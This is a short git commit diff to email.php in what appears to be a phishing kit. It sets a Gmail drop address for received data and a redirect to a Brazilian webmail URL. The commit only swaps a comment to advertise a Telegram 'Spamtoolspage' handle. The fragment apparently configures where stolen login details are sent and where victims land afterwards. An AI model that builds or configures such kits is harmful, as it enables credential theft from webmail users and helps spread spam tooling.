302920705339ecde7ab4af94097ee13149c006a1
microeaggle <systemupdate546@gmail.com>
2024-05-10 20:26:54 +0530

    Update email.php

--- email.php
+++ email.php
@@ -1,3 +1,3 @@
 <?php
-$receivedEmail = 'unicornhak4@gmail.com'; // Your email address
+$receivedEmail = 'unicornhak4@gmail.com'; // Telegram @Spamtoolspage
 $redirect = 'https://mail.comandoap.com.br/';
